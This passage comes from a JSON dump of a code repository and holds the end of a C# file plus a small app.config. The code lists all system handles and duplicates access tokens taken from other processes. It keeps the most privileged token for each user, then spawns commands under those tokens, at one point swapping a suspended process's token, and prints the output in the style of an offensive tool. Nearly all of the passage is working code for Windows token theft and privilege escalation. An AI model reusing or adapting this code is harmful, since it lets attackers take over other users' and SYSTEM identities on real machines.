{\n                TOKEN_STATISTICS tokenStatistics = (TOKEN_STATISTICS)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_STATISTICS));\n                Marshal.FreeHGlobal(tokenInfo);\n                LUID logonAuthId = tokenStatistics.AuthenticationId;\n                if (logonAuthId.LowPart == 998U)\n                {\n                    goto failRet;\n                }\n                IntPtr ppLogonSessionData = IntPtr.Zero;\n                uint status = NativeMethod.LsaGetLogonSessionData(ref logonAuthId, ref ppLogonSessionData);\n                if (status == NativeMethod.STATUS_SUCCESS)\n                {\n                    SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(SECURITY_LOGON_SESSION_DATA));\n                    string result = sessionData.AuthenticationPackage.ToString();\n                    logonType = (SECURITY_LOGON_TYPE)sessionData.LogonType;\n                    sessionId = sessionData.Session;\n                    logonDomain = sessionData.LogonDomain.ToString();\n                    NativeMethod.LsaFreeReturnBuffer(ppLogonSessionData);\n                    return result;\n                }\n\n            }\n        failRet:\n            logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;\n            sessionId = 0;\n            logonDomain = \"UnKnown\";\n            return \"UnKnown\";\n        }\n        public static IntegrityLevel GetTokenIntegrityLevel(IntPtr tokenHanle)\n        {\n            IntPtr infoPtr = IntPtr.Zero;\n            uint dwLength;\n            uint IntegrityLevel = 0;\n            if (NativeMethod.GetTokenInformation(tokenHanle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, out infoPtr, out dwLength))\n            {\n                TOKEN_MANDATORY_LABEL tokenMandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(infoPtr, typeof(TOKEN_MANDATORY_LABEL));\n                IntPtr SubAuthorityCount = NativeMethod.GetSidSubAuthorityCount(tokenMandatoryLabel.Label.Sid);\n\n                IntPtr IntegrityLevelRidPtr = NativeMethod.GetSidSubAuthority(tokenMandatoryLabel.Label.Sid, (uint)Marshal.ReadInt32(SubAuthorityCount) - 1);\n                uint IntegrityLevelRid = (uint)Marshal.ReadInt32(IntegrityLevelRidPtr);\n                Array integrityLevels = Enum.GetValues(typeof(IntegrityLevel));\n\n                for (int i = 0; i < integrityLevels.Length; i++)\n                {\n                    uint tmpRid = (uint)integrityLevels.GetValue(i);\n                    if (IntegrityLevelRid >= tmpRid)\n                    {\n                        IntegrityLevel = tmpRid;\n                    }\n                    else\n                    {\n                        break;\n                    }\n                }\n                Marshal.FreeHGlobal(infoPtr);\n\n            }\n            return (IntegrityLevel)Enum.ToObject(typeof(IntegrityLevel), IntegrityLevel);\n        }\n\n        public static bool GetTokenUIAccess(IntPtr tokenHandle)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint outLength = 0;\n            bool isTokenUIAccess = false;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUIAccess, out tokenInfo, out outLength))\n            {\n                if (Marshal.ReadByte(tokenInfo) != 0)\n                {\n                    isTokenUIAccess = true;\n                }\n\n                Marshal.FreeHGlobal(tokenInfo);\n            }\n            return isTokenUIAccess;\n        }\n        public bool CreateProcess(string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)\n        {\n\n            IntPtr tmpTokenHandle = IntPtr.Zero;\n            if (NativeMethod.DuplicateTokenEx(this.TokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, this.ImpersonationLevel, TOKEN_TYPE.TokenPrimary,\n                out tmpTokenHandle))\n            {\n                NativeMethod.CloseHandle(this.TokenHandle);\n                this.TokenHandle = tmpTokenHandle;\n            }\n            else\n            {\n                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n            }\n\n            NativeMethod.SetLastError(0);\n\n\n\n            //The TokenHandle of CreateProcessWithTokenW must have TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID permissions\n\n            if (NativeMethod.CreateProcessWithTokenW(this.TokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,\n        out processInformation))\n            {\n                return true;\n            }\n\n\n            if (NativeMethod.CreateProcessAsUserW(this.TokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags\n                                , IntPtr.Zero, null, ref startupinfo, out processInformation))\n            {\n                return true;\n            }\n            else if (Marshal.GetLastWin32Error() == 1314)\n            {\n                uint newDwCreationFlags = dwCreationFlags | (uint)ProcessCreateFlags.CREATE_SUSPENDED;\n                newDwCreationFlags |= (uint)ProcessCreateFlags.CREATE_UNICODE_ENVIRONMENT;\n                if (NativeMethod.CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, newDwCreationFlags, IntPtr.Zero, null, ref startupinfo, out processInformation))\n                {\n                    //init PROCESS_ACCESS_TOKEN\n                    uint PROCESS_ACCESS_TOKEN_SIZE = (uint)Marshal.SizeOf(typeof(PROCESS_ACCESS_TOKEN));\n                    PROCESS_ACCESS_TOKEN processAccessToken = new PROCESS_ACCESS_TOKEN();\n                    IntPtr tokenInfoPtr = Marshal.AllocHGlobal((int)PROCESS_ACCESS_TOKEN_SIZE);\n                    processAccessToken.Token = this.TokenHandle;\n                    processAccessToken.Thread = processInformation.hThread;\n                    Marshal.StructureToPtr(processAccessToken, tokenInfoPtr, false);\n\n                    uint status = NativeMethod.NtSetInformationProcess(processInformation.hProcess, PROCESS_INFORMATION_CLASS.ProcessAccessToken, tokenInfoPtr, PROCESS_ACCESS_TOKEN_SIZE);\n                    Marshal.FreeHGlobal(tokenInfoPtr);\n                    if (status == NativeMethod.STATUS_SUCCESS)\n                    {\n\n                        if ((dwCreationFlags & (uint)ProcessCreateFlags.PROFILE_USER) == 0)\n                        {\n                            if (NativeMethod.NtResumeProcess(processInformation.hProcess) != NativeMethod.STATUS_SUCCESS)\n                            {\n                                NativeMethod.CloseHandle(processInformation.hThread);\n                                NativeMethod.CloseHandle(processInformation.hProcess);\n                                NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);\n                                processInformation.hProcess = IntPtr.Zero;\n                                processInformation.hThread = IntPtr.Zero;\n                                return false;\n                            }\n                        }\n                        return true;\n                    }\n                    else\n                    {\n                        NativeMethod.CloseHandle(processInformation.hThread);\n                        NativeMethod.CloseHandle(processInformation.hProcess);\n                        NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);\n                        processInformation.hProcess = IntPtr.Zero;\n                        processInformation.hThread = IntPtr.Zero;\n                    }\n                }\n            }\n\n            return false;\n        }\n        public void Close()\n        {\n            if (this.TokenHandle != IntPtr.Zero && !IsClose)\n            {\n                IsClose = true;\n                NativeMethod.CloseHandle(this.TokenHandle);\n                this.TokenHandle = IntPtr.Zero;\n            }\n        }\n\n        public bool ImpersonateLoggedOnUser()\n        {\n            if (!IsClose && TokenHandle != IntPtr.Zero)\n            {\n                return NativeMethod.ImpersonateLoggedOnUser(this.TokenHandle);\n            }\n\n            return false;\n        }\n\n    }\n\n    [StructLayout(LayoutKind.Sequential, Pack = 1)]\n    public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX\n    { // Information Class 64\n        public IntPtr ObjectPointer;\n        public IntPtr ProcessID;\n        public IntPtr HandleValue;\n        public uint GrantedAccess;\n        public ushort CreatorBackTrackIndex;\n        public ushort ObjectType;\n        public uint HandleAttributes;\n        public uint Reserved;\n    }\n\n    public class TokenuUils\n    {\n        private static readonly int tokenType = getTokenType();\n\n\n        public static bool tryAddTokenPriv(IntPtr token, string privName)\n        {\n            TokenPrivileges tokenPrivileges = new TokenPrivileges();\n            if (NativeMethod.LookupPrivilegeValue(null, privName, out tokenPrivileges.Luid))\n            {\n\n                tokenPrivileges.PrivilegeCount = 1;\n                tokenPrivileges.Attributes = NativeMethod.SE_PRIVILEGE_ENABLED;\n                int ReturnLength = 0;\n                NativeMethod.SetLastError(0);\n                NativeMethod.AdjustTokenPrivileges(token, false, tokenPrivileges, 0, IntPtr.Zero, out ReturnLength);\n                if (Marshal.GetLastWin32Error() == NativeMethod.ERROR_SUCCESS)\n                {\n                    return true;\n                }\n            }\n            return false;\n        }\n        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] ListSystemHandle()\n        {\n\n            List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> result = new List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();\n            uint handleInfoSize = 1024 * 1024;\n            IntPtr handleInfoPtr = Marshal.AllocHGlobal((int)handleInfoSize);\n            uint returnSize = 0;\n            uint status = 0;\n            while ((status = NativeMethod.NtQuerySystemInformation(NativeMethod.SystemExtendedHandleInformation, handleInfoPtr, handleInfoSize, out returnSize)) ==\n                NativeMethod.STATUS_INFO_LENGTH_MISMATCH)\n            {\n                Marshal.FreeHGlobal(handleInfoPtr);\n                handleInfoPtr = Marshal.AllocHGlobal(new IntPtr(handleInfoSize *= 2));\n            }\n            if (status != NativeMethod.STATUS_SUCCESS)\n            {\n                //Console.WriteLine(\"NtQuerySystemInformation调用失败 ErrCode:\" + Marshal.GetLastWin32Error());\n                goto ret;\n            }\n            _SYSTEM_HANDLE_INFORMATION_EX handleInfo = (_SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(_SYSTEM_HANDLE_INFORMATION_EX));\n\n            uint NumberOfHandles = handleInfo.GetNumberOfHandles();\n            for (uint i = 0; i < NumberOfHandles; i++)\n            {\n                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = _SYSTEM_HANDLE_INFORMATION_EX.HandleAt(handleInfoPtr, i);\n                result.Add(handleEntry);\n            }\n        ret:\n            Marshal.FreeHGlobal(handleInfoPtr);\n            return result.ToArray();\n        }\n        public static int getTokenType()\n        {\n            int ret = -1;\n            Process currentProcess = Process.GetCurrentProcess();\n            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();\n            IntPtr currentThreadToken = windowsIdentity.Token;\n            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] handles = TokenuUils.ListSystemHandle();\n            for (int i = 0; i < handles.Length; i++)\n            {\n                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handles[i];\n                if (handleEntry.ProcessID.ToInt64() == currentProcess.Id && currentThreadToken == handleEntry.HandleValue)\n                {\n                    ret = handleEntry.ObjectType;\n                    goto ret;\n                }\n            }\n        ret:\n            windowsIdentity.Dispose();\n            currentProcess.Dispose();\n            return ret;\n        }\n\n        public delegate bool ListProcessTokensCallback(ProcessToken processToken);\n\n        public static bool ListProcessTokensDefaultCallback(ProcessToken processToken)\n        {\n            return true;\n        }\n\n        public static ProcessToken[] ListProcessTokens(int targetPid, ListProcessTokensCallback listProcessTokensCallback)\n        {\n            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] shteis = ListSystemHandle();\n            List<ProcessToken> processTokens = new List<ProcessToken>();\n            IntPtr localProcessHandle = NativeMethod.GetCurrentProcess();\n            IntPtr processHandle = IntPtr.Zero;\n            int lastPid = -1;\n            for (int i = 0; i < shteis.Length; i++)\n            {\n\n                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntryInfo = shteis[i];\n                int handleEntryPid = (int)handleEntryInfo.ProcessID.ToInt64();\n                if (targetPid > 0 && handleEntryPid == targetPid //过滤进程PID\n                    || targetPid <= 0//如果小于等于0就不过滤\n                    )\n                {\n\n                    if (lastPid != handleEntryPid)\n                    {\n                        if (processHandle != IntPtr.Zero)\n                        {\n                            NativeMethod.CloseHandle(processHandle);\n                            processHandle = IntPtr.Zero;\n                        }\n\n                        processHandle = NativeMethod.OpenProcess(ProcessAccessFlags.DuplicateHandle | ProcessAccessFlags.QueryInformation, false, handleEntryPid);\n\n                        if (processHandle != IntPtr.Zero)\n                        {\n                            IntPtr processToken = IntPtr.Zero;\n                            if (NativeMethod.OpenProcessToken(processHandle, NativeMethod.TOKEN_ELEVATION, out processToken))\n                            {\n                                ProcessToken token = ProcessToken.Cast(IntPtr.Zero, handleEntryPid, processHandle, processToken);\n                                if (token != null)\n                                {\n                                    if (listProcessTokensCallback.Invoke(token))\n                                    {\n                                        PutToken(processTokens, token);\n                                    }\n                                    else\n                                    {\n                                        token.Close();\n                                        goto end;\n                                    }\n                                }\n                            }\n                        }\n                        lastPid = handleEntryPid;\n\n                    }\n\n                    if (processHandle == IntPtr.Zero)\n                    {\n                        continue;\n                    }\n\n                    //GrantedAccess 0x0012019f 有可能会导致堵塞\n                    if (handleEntryInfo.ObjectType != tokenType || handleEntryInfo.GrantedAccess == 0x0012019f)\n                    {\n                        continue;\n                    }\n\n                    IntPtr dupHandle = IntPtr.Zero;\n                    if (NativeMethod.DuplicateHandle(processHandle, handleEntryInfo.HandleValue, localProcessHandle, out dupHandle,\n                            NativeMethod.GENERIC_EXECUTE | NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE, false, 0))\n                    {\n\n                        ProcessToken token = ProcessToken.Cast(handleEntryInfo.HandleValue, handleEntryPid, processHandle, dupHandle);\n                        if (token != null)\n                        {\n                            if (listProcessTokensCallback.Invoke(token))\n                            {\n                                PutToken(processTokens, token);\n                            }\n                            else\n                            {\n                                token.Close();\n                                goto end;\n                            }\n                        }\n                    }\n\n\n                    lastPid = handleEntryPid;\n                }\n            }\n\n        end:\n            if (processHandle != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(processHandle);\n            }\n            NativeMethod.CloseHandle(localProcessHandle);\n            return processTokens.ToArray();\n        }\n        private static void PutToken(List<ProcessToken> list, ProcessToken processToken)\n        {\n\n            if (processToken == null)\n            {\n                return;\n            }\n\n\n            for (int i = 0; i < list.Count; i++)\n            {\n                ProcessToken processTokenNode = list[i];\n                if (processTokenNode.UserName == processToken.UserName)\n                {\n                    if (processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel ||\n                        (processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel && (processToken.TokenElevationType == TOKEN_ELEVATION_TYPE.TokenElevationTypeFull || processToken.IntegrityLevel > processTokenNode.IntegrityLevel)))\n                    {\n                        if (!processToken.IsRestricted)\n                        {\n                            processTokenNode.Close();\n                            list[i] = processToken;\n                        }\n                    }\n                    else\n                    {\n                        processToken.Close();\n                    }\n                    return;\n                }\n            }\n            list.Add(processToken);\n\n        }\n\n\n        public static bool CreateProcess(IntPtr tokenHandle, string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)\n        {\n            TOKEN_TYPE tokenType = ProcessToken.GetTokenType(tokenHandle);\n            bool isClose = false;\n            bool isCreate = false;\n            if (tokenType != TOKEN_TYPE.TokenPrimary)\n            {\n                IntPtr tmpTokenHandle = IntPtr.Zero;\n                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenPrimary,\n                    out tmpTokenHandle))\n                {\n                    isClose = true;\n                    tokenHandle = tmpTokenHandle;\n                }\n            }\n\n            if (NativeMethod.CreateProcessAsUserW(tokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags\n        , IntPtr.Zero, null, ref startupinfo, out processInformation))\n            {\n                isCreate =  true;\n            }else if (NativeMethod.CreateProcessWithTokenW(tokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,\n                out processInformation))\n            {\n                isCreate =  true;\n            }\n\n            if (isClose)\n            {\n                NativeMethod.CloseHandle(tokenHandle);\n            }\n\n            return isCreate;\n\n        }\n        public static void createProcessReadOut(TextWriter consoleWriter, IntPtr tokenHandle, string commandLine)\n        {\n            IntPtr childProcessStdOutRead = IntPtr.Zero;\n            IntPtr childProcessStdOutWrite = IntPtr.Zero;\n\n            FileStream childProcessReadStream = null;\n\n            PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();\n\n            //初始化安全属性\n            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();\n\n            securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));\n            securityAttributes.pSecurityDescriptor = IntPtr.Zero;\n            securityAttributes.bInheritHandle = true;\n\n            //初始化子进程输出\n\n            if (!NativeMethod.CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,\n                    ref securityAttributes, 8196))\n            {\n                goto end;\n            }\n\n\n            STARTUPINFO startupInfo = new STARTUPINFO();\n            startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));\n            startupInfo.hStdError = childProcessStdOutWrite;\n            startupInfo.hStdOutput = childProcessStdOutWrite;\n            startupInfo.hStdInput = IntPtr.Zero;\n            startupInfo.dwFlags = (int)NativeMethod.STARTF_USESTDHANDLES;\n\n            NativeMethod.SetHandleInformation(childProcessStdOutRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);\n            NativeMethod.SetHandleInformation(childProcessStdOutWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);\n\n\n\n            if (CreateProcess(tokenHandle, commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,\n                    out processInformation))\n            {\n                consoleWriter.WriteLine($\"[*] process start with pid {processInformation.dwProcessId}\");\n\n                NativeMethod.CloseHandle(childProcessStdOutWrite);\n                childProcessStdOutWrite = IntPtr.Zero;\n\n                childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);\n\n                byte[] readBytes = new byte[4096];\n                uint bytesAvail = 0;\n                uint BytesLeftThisMessage = 0;\n                uint bytesRead = 0;\n                int read = 0;\n\n                while (true)\n                {\n                    if (!NativeMethod.PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,\n                        ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))\n                    {\n                        break;\n                    }\n\n                    if (bytesAvail > 0)\n                    {\n                        read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);\n                        consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));\n                    }\n\n                }\n\n\n            }\n            else\n            {\n                consoleWriter.WriteLine($\"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}\");\n            }\n        end:\n            if (childProcessReadStream != null)\n            {\n                childProcessReadStream.Close();\n            }\n            if (processInformation.hProcess != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(processInformation.hProcess);\n            }\n            if (processInformation.hThread != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(processInformation.hThread);\n            }\n            if (childProcessStdOutRead != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(childProcessStdOutRead);\n            }\n            if (childProcessStdOutWrite != IntPtr.Zero)\n            {\n                NativeMethod.CloseHandle(childProcessStdOutWrite);\n            }\n        }\n\n\n    }\n\n\n\n}\n"
        },
        {
          "name": "app.config",
          "type": "blob",
          "size": 0.1279296875,
          "content": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n<startup><supportedRuntime version=\"v2.0.50727\"/></startup></configuration>\n"
        },
        {
          "name": "images",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}